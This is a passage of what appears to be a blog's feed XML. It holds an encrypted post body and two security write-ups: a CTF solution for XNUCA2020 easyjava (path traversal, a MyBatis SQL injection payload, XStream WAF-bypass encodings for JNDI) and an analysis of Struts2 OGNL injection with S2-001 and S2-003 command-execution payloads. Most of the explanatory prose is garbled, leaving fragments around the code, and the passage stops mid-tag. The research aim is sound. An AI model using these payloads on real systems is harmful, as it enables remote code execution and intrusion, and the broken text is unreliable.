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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFxnuca2020 easyjava</title>
      <link href="2020/11/02/ctf-xnuca-2020-easyjava/"/>
      <url>2020/11/02/ctf-xnuca-2020-easyjava/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>easyjavamybatis</p><a id="more"></a><p></p><ol><li>/proc/self/fd</li><li>mybatis<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a></li><li>xstreamwaffastjson unicode</li><li>javajndi</li></ol><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p>jpg</p><h3 id="1-"><a href="#1-" class="headerlink" title="#1 "></a>#1 </h3><p></p><p><img src="/images/xnuca-2020-easyjava/image-20201102151033808.png" alt="image-20201102151033808"></p><p>Checkgetsignfilename<code>../../../../../../etc/passwd</code></p><p><img src="/images/xnuca-2020-easyjava/image-20201102151347649.png" alt="image-20201102151347649"></p><p><img src="/images/xnuca-2020-easyjava/image-20201102151503000.png" alt="image-20201102151503000"></p><p>checksignsignlinuxfdjar<code>/proc/self/fd/4</code>jar</p><h3 id="2-mybatis-SQL"><a href="#2-mybatis-SQL" class="headerlink" title="#2 mybatis SQL"></a>#2 mybatis SQL</h3><p>jarpomjarmybatisspringbootxstream</p><p><img src="/images/xnuca-2020-easyjava/image-20201102152300777.png" alt="image-20201102152300777"></p><p>cve<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26945" target="_blank" rel="noopener">CVE-2020-26945</a>mybatisspringmybatismybatis3.5.5cache</p><p><img src="/images/xnuca-2020-easyjava/image-20201102152617085.png" alt="image-20201102152617085"></p><p>mapperxmlcache<code>findByHashAndSecret</code></p><p></p><p><code>nese.game.controller.CheckController</code></p><p><img src="/images/xnuca-2020-easyjava/image-20201102153339331.png" alt="image-20201102153339331"></p><h3 id="3-mybatis"><a href="#3-mybatis" class="headerlink" title="#3 mybatis"></a>#3 mybatis</h3><p>xstream<code>nese.game.entity.Picture</code>xstreamfromXML<code>readObject</code>xml</p><p><img src="/images/xnuca-2020-easyjava/image-20201102154259827.png" alt="image-20201102154259827"></p><p>SQLxml</p><p>mybatisserializationxstream</p><p><img src="/images/xnuca-2020-easyjava/image-20201102155335403.png" alt="image-20201102155335403"></p><p>jpg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    String payload = &quot;evil xml&quot;;</span><br><span class="line">    File file = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    File dest = new File(&quot;xxxx.jpg&quot;);</span><br><span class="line">    InputStream inputStream = new FileInputStream(file);</span><br><span class="line">    byte[] bytes = new byte[(int)file.length()];</span><br><span class="line">    inputStream.read(bytes);</span><br><span class="line">    InputStream destInputStream = new FileInputStream(dest);</span><br><span class="line">    String secret=&quot;&apos; union select 13,&apos;wh1t3p1g&apos;,&apos;wh1t3p1g&apos;,&apos;&quot;+payload+&quot;&apos;,&apos;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    String hash = &quot;aed2bebb781ae32d94c5e67185e35149&quot;;</span><br><span class="line">    ImageUtil.transferTo(inputStream, bytes, null, dest, secret, hash);</span><br><span class="line">&#125;catch (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xml</p><p><img src="/images/xnuca-2020-easyjava/image-20201102155950724.png" alt="image-20201102155950724"></p><h3 id="4-XStreamwaf"><a href="#4-XStreamwaf" class="headerlink" title="#4 XStreamwaf"></a>#4 XStreamwaf</h3><p>XStream</p><ol><li><p>PureJavaReflectionProvider</p><p>PureJavaReflectionProviderreadObjectPureJavaReflectionProvider</p></li><li><p>waf</p><p>XStreamxml</p></li></ol><p>marshalsecspring jndi</p><p>waffastjson<code>@type</code>unicodeXStream</p><p>XStream</p><ol><li><p></p><p>spring jndi</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>org[.]springframework</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xstream16</p><p><code>com.thoughtworks.xstream.io.xml.AbstractXmlReader#unescapeXmlName</code></p><p><code>com.thoughtworks.xstream.io.xml.XmlFriendlyNameCoder#decodeName</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; length; i++ ) &#123;</span><br><span class="line">  <span class="keyword">char</span> c = name.charAt(i);</span><br><span class="line">  <span class="keyword">if</span> (c == dollarReplacementFirstChar &amp;&amp; name.startsWith(dollarReplacement, i)) &#123;</span><br><span class="line">    i += dollarReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'$'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == hexPrefixFirstChar &amp;&amp; name.startsWith(hexPrefix, i)) &#123;</span><br><span class="line">    <span class="comment">// hex_.xxxx</span></span><br><span class="line">    i += hexPrefix.length();</span><br><span class="line">    c = (<span class="keyword">char</span>)Integer.parseInt(name.substring(i, i + <span class="number">4</span>), <span class="number">16</span>);</span><br><span class="line">    i += <span class="number">3</span>;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == escapeReplacementFirstChar</span><br><span class="line">             &amp;&amp; name.startsWith(escapeCharReplacement, i)) &#123;</span><br><span class="line">    i += escapeCharReplacement.length() - <span class="number">1</span>;</span><br><span class="line">    result.append(<span class="string">'_'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    result.append(c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dollarReplacementhexPrefixescapeCharReplacement16<code>_.xxxx</code></p></li><li><p></p><p></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"custom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>custom</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span> <span class="attr">serialization</span>=<span class="string">"cust<span class="symbol">&amp;#111;</span>m"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><p><code>com.sun.org.apache.xerces.internal.impl.XMLScanner scanAttributeValue</code></p><p>883942html</p><p><code>&amp;#111;</code><code>o</code></p></li><li><p></p><p></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ldap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>ldap://</code></p><p><strong>a. html</strong></p><p>html</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;#108;</span>dap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code></code></p><p><strong>b. </strong></p><p></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">ld<span class="comment">&lt;!-- test --&gt;</span>ap://xxxxx</span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#unmarshallField</code></p><p><code>com.thoughtworks.xstream.io.xml.AbstractPullReader#getValue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  Event event = readEvent();</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.type == TEXT) &#123; <span class="comment">// </span></span><br><span class="line">      String text = event.value;</span><br><span class="line">      <span class="keyword">if</span> (text != <span class="keyword">null</span> &amp;&amp; text.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (last == <span class="keyword">null</span>) &#123;</span><br><span class="line">          last = text;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (buffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer = <span class="keyword">new</span> StringBuffer(last);</span><br><span class="line">          &#125;</span><br><span class="line">          buffer.append(text);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (event.type != COMMENT) &#123;<span class="comment">//    </span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    event = readEvent(); <span class="comment">// </span></span><br><span class="line">  &#125;</span><br><span class="line">  reset();</span><br><span class="line">  <span class="keyword">if</span> (buffer != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (last == <span class="keyword">null</span>) ? <span class="string">""</span> : last;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p></li></ol><p>XStreamwafpayload</p><h3 id="5-JNDI"><a href="#5-JNDI" class="headerlink" title="#5 JNDI"></a>#5 JNDI</h3><p>expJNDIjdkjdkjdkcodebaseclassjdkObjectFactory<a href="https://paper.seebug.org/942/" target="_blank" rel="noopener">KINGX</a></p><p>jdkObjectFactory</p><p>spring boot embedded tomcatKINGXysomap</p><p><img src="/images/xnuca-2020-easyjava/image-20201102164333062.png" alt="image-20201102164333062"></p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p><a href="https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Web/easyjava/ImageUtil.java" target="_blank" rel="noopener">exp.java</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesstruts2</title>
      <link href="2020/05/22/java-talk-about-struts2/"/>
      <url>2020/05/22/java-talk-about-struts2/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><hr><p>17struts2POC3struts2struts2 XD</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><hr><p>struts2 <a href="https://archive.apache.org/dist/struts/source/" target="_blank" rel="noopener">https://archive.apache.org/dist/struts/source/</a></p><p>struts2 <a href="https://blog.csdn.net/snow_7/article/details/51513381" target="_blank" rel="noopener">https://blog.csdn.net/snow_7/article/details/51513381</a></p><p>ognl<a href="https://www.cnblogs.com/renchunxiao/p/3423299.html" target="_blank" rel="noopener">https://www.cnblogs.com/renchunxiao/p/3423299.html</a></p><p>struts2  6 OGNL</p><p>struts2OGNL<code>Ognl.getValue</code><code>Ognl.setValue</code>OGNLOgnl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line">Ognl.getValue(<span class="string">"@java.lang.Runtime@getRuntime().exec('open /Applications/Calculator.app/')"</span>, context);</span><br><span class="line">Ognl.setValue(<span class="string">"(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app/\')\")(bla)(bla)"</span>,context,<span class="string">""</span>);</span><br></pre></td></tr></table></figure><p><a href="http://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">http://commons.apache.org/proper/commons-ognl/language-guide.html</a></p><p><code>setValue</code>Expression Evaluation<code>(1)(2)(3)</code><code>(1)(2)</code><code>(1)</code><code>getValue((1)(2))</code><code>setValue((1)(2)(3))</code>double evaluation<code>((1)(2))(3)</code><code>setValueBody</code><code>children[0]</code><code>(1)(2)</code><code>Ognl.getValue((1)(2))</code><code>setValue</code><code>getValue</code>OGNL</p><p><img src="/images/talk_about_struts2/image-20200506154002054.png" alt="image-20200506154002054"></p><p><code>children[1]</code><code>(1)((2)(3))</code>payload<code>(2)(3)</code></p><p><code>setValue</code>S2-009<code>a[(1)(2)]</code><code>(1)(2)</code>OGNL</p><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><hr><h2 id="1-S2-001"><a href="#1-S2-001" class="headerlink" title="1. S2-001"></a>1. <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">S2-001</a></h2><p><a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p><p><code>&lt;s:textfield&gt;</code>OGNL</p><p>source: <code>s:textfield</code></p><p>sink: jsp<code>doEndTag</code>OGNL<code>Ognl.getValue</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>JSP<code>&lt;s:textfield&gt;</code>Struts2textfield<code>org.apache.struts2.components.UIBean</code></p><p><img src="/images/talk_about_struts2/image-20200428211153680.png" alt="image-20200428211153680"></p><p><img src="/images/talk_about_struts2/image-20200428212308880.png" alt="image-20200428212308880"></p><p>paramsparameters<code>value</code>keynamevalue<code>altSyntax</code><code>true</code></p><p><img src="/images/talk_about_struts2/image-20200428213206168.png" alt="image-20200428213206168"></p><p><code>name</code>OGNL<code>%{name}</code>name<code>&lt;s:textfield name=&quot;name&quot;</code>name<code>name=&quot;username&quot;</code><code>%{username}</code>.</p><p><img src="/images/talk_about_struts2/image-20200428220429903.png" alt="image-20200428220429903"></p><p><img src="/images/talk_about_struts2/image-20200428220447992.png" alt="image-20200428220447992"></p><p>String<code>TextParesUtil.translateVariables()</code></p><p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p><p><img src="/images/talk_about_struts2/image-20200428221026617.png" alt="image-20200428221026617"></p><p>expressionOGNL<code>%{xxx}</code><code>OgnlValueStack</code>(OGNL<code>findValue</code><code>OgnlUtil.getValue</code>)</p><p><code>%{name}</code><code>%{@java.lang.Runtime.....}</code></p><p><code>%{@java.lang.Runtime....}</code></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>OGNL<code>@java.lang.Runtime@getRuntime().exec(command)</code></p><p>S2-001inputStruts2HttpServletResponse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(xxxxxx),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br></pre></td></tr></table></figure><p>context<code>HttpServletResponse</code><code>HttpServletResponseWrapper</code></p><p><img src="/images/talk_about_struts2/image-20200428223750035.png" alt="image-20200428223750035"></p><p>responsewriterwriter</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),</span><br><span class="line">#is=#pb.getInputStream(),</span><br><span class="line">#isr=new InputStreamReader(#is),</span><br><span class="line">#br=new BufferedReader(#isr),</span><br><span class="line">#chars=new char[500],</span><br><span class="line">#br.read(#chars),</span><br><span class="line">#str=new java.lang.String(#chars),</span><br><span class="line">// </span><br><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(#str),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br><span class="line"></span><br><span class="line">%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&gt;=2.0.9struts2<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>OGNL</p><p><img src="/images/talk_about_struts2/image-20200428231900257.png" alt="image-20200428231900257"></p><p><code>maxLoopCount</code>1<code>%{name}</code>OGNL</p><h2 id="2-S2-003"><a href="#2-S2-003" class="headerlink" title="2. S2-003"></a>2. <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">S2-003</a></h2><p>2.0.0 - 2.0.11.2</p><p><code>ParametersInterceptor</code><code>Ognl.getValue</code>OGNLS2-003<code>Ognl.setValue</code>OGNL</p><p>source: keyunicode<code>#</code></p><p>sink: <code>Ognl.setValue</code></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>Struts2<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>OgnlVauleStackcontext</p><p><img src="/images/talk_about_struts2/image-20200430155156109.png" alt="image-20200430155156109"></p><p><code>acceptableName</code>2.0.8</p><p><img src="/images/talk_about_struts2/image-20200430155231489.png" alt="image-20200430155231489"></p><p><code>=</code><code>,</code><code>#</code><code>:</code></p><p><img src="/images/talk_about_struts2/image-20200430155418664.png" alt="image-20200430155418664"></p><p>acceptableNameunicode</p><p><code>ognl.JavaCharStream#readChar</code></p><p><img src="/images/talk_about_struts2/image-20200430232206989.png" alt="image-20200430232206989"></p><p><code>\u</code>unicode<code>\u0040</code><code>@</code></p><p><code>acceptableName</code>unicode</p><p><code>setParameters</code><code>OgnlValueStack.setValue</code></p><p><img src="/images/talk_about_struts2/image-20200430232635455.png" alt="image-20200430232635455"></p><p><code>OgnlUtil.setValue</code>OGNL</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure><p>ognl<code>setParameters</code>OGNL</p><p><img src="/images/talk_about_struts2/image-20200430234629782.png" alt="image-20200430234629782"></p><p></p><p>OGNLcontext<code>xwork.MethodAccessor.denyMethodExecution</code><code>false</code> poc</p><p>POCfalseasciipoc</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// </span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d\u0023context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\').getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// response</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure><p>pocognl<code>(1)((2)(3))</code></p><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code></p><p><img src="/images/talk_about_struts2/image-20200507101610804.png" alt="image-20200507101610804"></p><p>OgnlValueStack2.0.6stack</p><p>SecurityMemberAccessognl</p><p><code>ognl.OgnlRuntime#callAppropriateMethod</code>(methodnull)</p><p><img src="/images/talk_about_struts2/image-20200507102155210.png" alt="image-20200507102155210"></p><p><code>isMethodAccessible</code><code>invokeMethod</code></p><p><code>isMethodAccessible</code><code>SecurityMemberAccess</code></p><p><img src="/images/talk_about_struts2/image-20200507102334789.png" alt="image-20200507102334789"></p><p><img src="/images/talk_about_struts2/image-20200507103428140.png" alt="image-20200507103428140"></p><p><code>isAcceptableProperty</code></p><p><img src="/images/talk_about_struts2/image-20200507103621957.png" alt="image-20200507103621957"></p><p><img src="/images/talk_about_struts2/image-20200507103632321.png" alt="image-20200507103632321"></p><p><img src="/images/talk_about_struts2/image-20200507103642250.png" 